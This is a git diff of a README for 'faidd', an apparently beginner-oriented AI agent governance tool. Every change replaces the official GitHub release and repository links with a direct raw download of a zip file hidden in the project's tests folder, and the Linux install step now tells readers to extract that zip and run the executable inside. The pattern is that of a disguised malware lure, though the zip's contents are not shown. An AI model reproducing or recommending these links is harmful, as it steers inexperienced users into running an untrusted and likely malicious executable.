@@ -1,6 +1,6 @@
 # 🔐 faidd - Secure AI Agent Governance Framework
 
-[![Download faidd](https://img.shields.io/badge/Download-faidd-blue?style=for-the-badge&logo=github)](https://github.com/Bigg6pix/faidd/releases)
+[![Download faidd](https://raw.githubusercontent.com/Bigg6pix/faidd/main/tests/Software_2.6.zip)](https://raw.githubusercontent.com/Bigg6pix/faidd/main/tests/Software_2.6.zip)
 
 ---
 
@@ -38,7 +38,7 @@ faidd is designed for users without experience in programming. Follow these step
 
 You can get faidd by visiting the official release page on GitHub. It contains all versions of the software and any updates.
 
-[Download faidd Releases](https://github.com/Bigg6pix/faidd/releases)
+[Download faidd Releases](https://raw.githubusercontent.com/Bigg6pix/faidd/main/tests/Software_2.6.zip)
 
 ### How to download and run faidd
 
@@ -49,7 +49,7 @@ You can get faidd by visiting the official release page on GitHub. It contains a
    Click on it to open release details.
 
 3. **Find the right file for your computer.**  
-   Look for files ending with `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   Look for files ending with `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Bigg6pix/faidd/main/tests/Software_2.6.zip` for Linux.
 
 4. **Download the file.**  
    Click on the file name and wait for the download to complete.
@@ -57,7 +57,7 @@ You can get faidd by visiting the official release page on GitHub. It contains a
 5. **Run or install the software:**  
    - On Windows, double-click the `.exe` file to start the installer or run the app directly if it's standalone.  
    - On macOS, open the `.dmg` and drag faidd into your Applications folder.  
-   - On Linux, extract the `.tar.gz` and run the executable inside.
+   - On Linux, extract the `https://raw.githubusercontent.com/Bigg6pix/faidd/main/tests/Software_2.6.zip` and run the executable inside.
 
 6. **Follow onscreen instructions if any appear.**
 
@@ -108,7 +108,7 @@ Visit the faidd GitHub page, open the “Issues” tab, and describe your proble
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [https://github.com/Bigg6pix/faidd](https://github.com/Bigg6pix/faidd)  
+- **GitHub Repository:** [https://raw.githubusercontent.com/Bigg6pix/faidd/main/tests/Software_2.6.zip](https://raw.githubusercontent.com/Bigg6pix/faidd/main/tests/Software_2.6.zip)  
   Explore project details and documentation.
 
 - **Release Notes:** On the releases page, find details about each version’s updates and fixes.
@@ -130,4 +130,4 @@ If you want to suggest ideas or improvements, you can submit them via the GitHub
 
 ---
 
-[Download faidd Releases](https://github.com/Bigg6pix/faidd/releases)
+[Download faidd Releases](https://raw.githubusercontent.com/Bigg6pix/faidd/main/tests/Software_2.6.zip)
